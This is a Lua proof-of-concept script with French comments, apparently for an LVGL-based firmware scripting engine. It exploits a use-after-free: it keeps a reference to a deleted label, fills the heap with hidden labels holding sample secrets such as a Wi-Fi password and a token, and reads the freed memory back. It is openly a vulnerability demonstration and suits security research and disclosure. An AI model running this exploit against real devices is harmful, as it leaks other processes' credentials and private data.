-- ============================================================================
--  POC : Lecture de donnees residuelles en RAM via Use-After-Free
-- ============================================================================
--
--  Ce PoC montre qu'on peut lire de la memoire qu'on n'a PAS ecrite :
--  apres del(), la RAM n'est pas nettoyee et le dangling pointer
--  permet de lire ce qu'un AUTRE objet a ecrit dans la meme zone.
--
-- ============================================================================

local GREEN = lv.color.hex(0x00FF41)
local RED   = lv.color.hex(0xFF0000)
local WHITE = lv.color.hex(0xFFFFFF)
local AMBER = lv.color.hex(0xFFBF00)
local DARK  = lv.color.hex(0x0a0a0a)

local function log(msg)
    print("[RESIDUAL] " .. msg)
end

lv.obj.set_style_bg_color(window, lv.color.hex(0x000000), 0)
lv.obj.set_style_bg_opa(window, lv.OPA_COVER, 0)

-- ============================================================================
--  STRATEGIE
--  ---------
--  1. Creer un label "espion" (spy) — notre dangling pointer
--  2. Le supprimer
--  3. Creer plein de labels avec du contenu DIFFERENT (simulant
--     l'activite normale du firmware : menus, notifications, etc.)
--  4. Lire via spy → on obtient le contenu d'un label qu'on n'a
--     pas cible, prouvant qu'on lit la RAM d'autrui
-- ============================================================================

log("")
log("=== ETAPE 1 : Creer le label espion ===")

local spy = lv.label.new(window)
lv.label.set_text(spy, "AAA")       -- contenu anodin, on s'en fiche
lv.obj.add_flag(spy, lv.OBJ_FLAG_HIDDEN)

log("  Label espion cree avec texte 'AAA'")
log("")

-- ============================================================================
log("=== ETAPE 2 : Supprimer le label espion ===")

lv.obj.del(spy)

log("  lv.obj.del(spy) → memoire liberee, ref Lua toujours vivante")
log("")

-- ============================================================================
log("=== ETAPE 3 : Simuler l'activite du firmware ===")
log("")
log("  D'autres parties du systeme creent des labels")
log("  (menus, notifications, debug interne...)")
log("  L'allocateur reutilise les blocs liberes.")
log("")

-- Simuler des donnees internes du firmware que le script
-- malveillant n'est PAS cense pouvoir lire :
local internal_data = {
    "BLE:paired=A4:C1:38:FF",
    "wifi_psk=M0nR3seau!",
    "user_token=9f3a7c1b2e",
    "device_key=HMAC-SHA256",
    "fw_build=2024.3.15-rc2",
    "battery_sn=LiPo-04812",
    "crash_log=0xDEADBEEF",
    "heap_free=14832 bytes",
}

local internal_labels = {}
for i, text in ipairs(internal_data) do
    internal_labels[i] = lv.label.new(window)
    lv.label.set_text(internal_labels[i], text)
    lv.obj.add_flag(internal_labels[i], lv.OBJ_FLAG_HIDDEN)
    log("  [firmware] " .. text)
end

log("")

-- ============================================================================
log("=== ETAPE 4 : Lecture via le dangling pointer ===")
log("")

-- Lire AVANT de creer quoi que ce soit d'affichage
-- pour ne pas polluer les resultats
local leaked_text = nil
local read_ok, read_result = pcall(lv.label.get_text, spy)
if read_ok and read_result then
    leaked_text = read_result
end

log("  get_text(spy) apres del + activite firmware :")
if leaked_text then
    log("  >>> \"" .. leaked_text .. "\"")
    log("")
    if leaked_text == "AAA" then
        log("  → Donnees residuelles du label original")
    else
        -- Chercher si ca correspond a une donnee interne
        local match = false
        for _, d in ipairs(internal_data) do
            if leaked_text == d then
                log("  → CORRESPOND A UNE DONNEE FIRMWARE INTERNE !")
                log("    Cette donnee a ete ecrite par une autre partie du code.")
                log("    Le script n'y avait pas acces — fuite confirmee.")
                match = true
                break
            end
        end
        if not match then
            log("  → Donnee provenant d'un autre objet (fragment memoire)")
        end
    end
else
    log("  >>> CRASH ou nil — la memoire n'etait pas un label valide")
end

-- ============================================================================
-- Maintenant on peut afficher les resultats a l'ecran
-- ============================================================================

local title = lv.label.new(window)
lv.label.set_text(title, "Lecture RAM via dangling ptr")
lv.obj.set_style_text_color(title, RED, 0)
lv.obj.align(title, lv.ALIGN_TOP_MID, 0, 35)

local box = lv.obj.new(window)
lv.obj.set_size(box, 295, 120)
lv.obj.align(box, lv.ALIGN_CENTER, 0, 10)
lv.obj.set_style_bg_color(box, DARK, 0)
lv.obj.set_style_bg_opa(box, lv.OPA_COVER, 0)
lv.obj.set_style_radius(box, 6, 0)
lv.obj.remove_flag(box, lv.OBJ_FLAG_SCROLLABLE)

-- Ligne 1 : ce qu'on a fait
local l1 = lv.label.new(box)
lv.label.set_text(l1, "> spy = lv.label.new()")
lv.obj.set_style_text_color(l1, GREEN, 0)
lv.obj.align(l1, lv.ALIGN_TOP_LEFT, 6, 4)

local l2 = lv.label.new(box)
lv.label.set_text(l2, "> lv.obj.del(spy)")
lv.obj.set_style_text_color(l2, GREEN, 0)
lv.obj.align(l2, lv.ALIGN_TOP_LEFT, 6, 20)

local l3 = lv.label.new(box)
lv.label.set_text(l3, "> -- firmware cree d'autres labels --")
lv.obj.set_style_text_color(l3, AMBER, 0)
lv.obj.align(l3, lv.ALIGN_TOP_LEFT, 6, 36)

local l4 = lv.label.new(box)
lv.label.set_text(l4, "> lv.label.get_text(spy) =")
lv.obj.set_style_text_color(l4, GREEN, 0)
lv.obj.align(l4, lv.ALIGN_TOP_LEFT, 6, 56)

local l5 = lv.label.new(box)
if leaked_text then
    lv.label.set_text(l5, "  \"" .. leaked_text .. "\"")
    if leaked_text ~= "AAA" then
        lv.obj.set_style_text_color(l5, RED, 0)
    else
        lv.obj.set_style_text_color(l5, AMBER, 0)
    end
else
    lv.label.set_text(l5, "  <crash>")
    lv.obj.set_style_text_color(l5, WHITE, 0)
end
lv.obj.align(l5, lv.ALIGN_TOP_LEFT, 6, 72)

-- Verdict
local verdict = lv.label.new(box)
if leaked_text and leaked_text ~= "AAA" then
    lv.label.set_text(verdict, "Fuite : donnee lue depuis la RAM !")
    lv.obj.set_style_text_color(verdict, RED, 0)
else
    lv.label.set_text(verdict, "Donnees residuelles du label original")
    lv.obj.set_style_text_color(verdict, AMBER, 0)
end
lv.obj.align(verdict, lv.ALIGN_TOP_LEFT, 6, 96)

log("")
log("  Regardez l'ecran. Fermez la fenetre pour quitter.")
